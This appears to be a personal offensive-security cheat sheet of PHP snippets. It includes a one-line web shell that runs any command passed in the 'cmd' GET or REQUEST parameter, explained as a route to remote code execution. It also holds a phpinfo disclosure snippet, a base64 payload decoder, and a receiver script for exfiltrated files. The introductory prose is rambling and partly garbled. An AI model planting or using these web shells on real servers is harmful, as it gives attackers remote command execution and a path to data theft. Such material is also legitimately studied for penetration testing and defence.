# Useful_PHP

[RTFM here is a documentation](https://www.php.net/) below is just useful php with description how its workings. One of the many Web-Hackronomicons of eye-brow-raising levels of secure language design with the insanity of multiple function calls capable of doing the exact same thing. Try to remember which are all of the vulnerable code in which server context anduser context when humans like trust and favourites, where is the person that shouts remember the Pwhpaarrr 1.69 version of with a similar function called that is allowed by some design loop hole. 

PHP webserver
```bash
php -S 0.0.0.0:8000
```

Execute file:
```bash
php file.php
```

## Scripting

Http `cmd` super global variable function for RCEs  
```php
<?php system($_GET['cmd']); ?>
```
`<?php` is the script tag, `system()`is the function call, `$_GET` is a reserved(in standard libvrary) [superglobal variable for HTTP GET](https://www.php.net/manual/en/reserved.variables.get.php), `['cmd']` ,`;` is line terminating character and finally `?>` is the closing script tag. 

```php
<?php system($_REQUEST['cmd']); ?>
```

phpinfo displayer
```PHP
<?php echo("Hello");phpinfo(); ?>
```

Base64 PHP decoder
```PHP
<?php echo zlib_decode(base64_decode('base64here')); ?>
```

## Vulnerable Functions
[[Vulnerable-PHP-Functions]]

## Webserver Exfiltratation

Curl post data to the webserver to then login to exfiltrate
```php
<?php 
if (isset($_POST['file'])) {
        $file = fopen("/tmp/http.bs64","w");
        fwrite($file, $_POST['file']);
        fclose($file);
   }
?>
```

Put your horrible PHP in html: [php.net](https://www.php.net/manual/en/language.basic-syntax.phpmode.php)

## References

[HTTP GET superglobal variable](https://www.php.net/manual/en/reserved.variables.get.php)
[php.net](https://www.php.net/) 
